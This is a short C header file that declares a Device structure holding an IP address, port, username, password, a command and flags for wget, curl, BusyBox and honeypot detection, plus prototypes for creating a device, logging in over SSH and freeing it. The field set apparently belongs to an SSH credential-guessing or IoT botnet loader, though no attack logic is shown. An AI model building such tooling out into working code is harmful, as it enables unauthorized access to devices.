#pragma once

typedef struct Device {
    int     Status;
    char    *IP;
    int     Port;
    char    *Username;
    char    *Password;
    char    *Cmd;
    int     LoggedIn;
    int     isWGET;
    int     isCURL;
    int     isBusybox;
    int     isHoneypot;
} Device;

Device *NewDevice(const char *IP, int prt, const char *uname, const char *pw);
int ssh(Device *device);
void DestroyDevice(Device *c);